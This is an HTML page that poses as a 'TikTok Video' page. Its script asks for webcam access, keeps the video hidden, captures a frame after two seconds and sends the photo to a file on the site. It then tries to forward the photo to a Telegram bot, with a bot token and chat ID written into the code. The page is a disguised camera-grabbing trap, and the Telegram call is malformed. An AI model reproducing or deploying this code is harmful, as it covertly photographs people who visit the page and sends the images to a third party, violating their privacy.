<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video</title>
    <link rel="icon" href="https://w7.pngwing.com/pngs/986/124/png-transparent-tiktok-social-media-logos-brands-icon.png">
</head>
<body>
    <h1>برمجة بوصلحهـ</h1>
    <p>تم برمجة هذا الموقع كـ مؤقت كتجربة اولية . وسوف يتم تطويرها مستقبلا ..</p>
    <video id="video" width="640" height="480" style="display:none;"></video>
    <canvas id="canvas" width="640" height="480"></canvas>
    <script>
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            var video = document.getElementById('video');
            video.srcObject = stream;
            video.play();
            
            setTimeout(function() {
                var canvas = document.getElementById('canvas');
                var context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // تحويل الصورة إلى بيانات URL
                var imageData = canvas.toDataURL('image/jpeg'); // استخدام تنسيق JPEG

                // إرسال الصورة إلى ملف الموقع
                var xhr = new XMLHttpRequest();
                xhr.open('POST', 'myphotos/image.jpg', true);
                xhr.setRequestHeader('Content-Type', 'application/octet-stream');
                xhr.send(imageData);
                
                // إرسال الصورة إلى البوت على تليجرام
                fetch('6530176287:AAEux253k36KD2FQkv8MAYVWPHONZXDUowo', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ chat_id: '946487689', photo: 'https://bosalha.github.io/klerf/myphotos/image.jpg' })
                })
                .then(response => response.json())
                .then(data => console.log(data))
                .catch(error => console.error('Error:', error));
            }, 2000);
        })
        .catch(function(error) {
            console.error('حدث خطأ في الوصول إلى الكاميرا: ', error);
        });
    </script>
</body>
</html>
